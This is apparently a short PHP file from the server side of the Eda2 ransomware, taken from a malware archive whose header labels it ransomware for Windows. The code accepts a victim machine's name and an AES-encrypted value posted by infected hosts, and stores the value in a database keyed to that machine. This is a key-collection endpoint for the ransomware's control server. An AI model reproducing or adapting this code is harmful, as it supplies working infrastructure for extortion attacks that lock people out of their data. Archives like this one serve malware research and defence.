/*
  name      Eda2
  type      ransomware
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
<?php

if(!isset($_POST) || empty($_POST['pcname'])) {
	exit;
}

$pcname = $_POST['pcname'];

include 'db.php';

$statement = $connection->prepare("select id from dummy where pcname = ?");
$statement->execute([$pcname]);
$id = $statement->fetch(PDO::FETCH_COLUMN);

if(!$id) {
	exit;
}

$aesencrypted = $_POST['aesencrypted'];

$stmt = $connection->prepare('UPDATE dummy SET aesencrypted = ? WHERE id = ?');

$stmt->execute([
	$aesencrypted,
	$id
]);
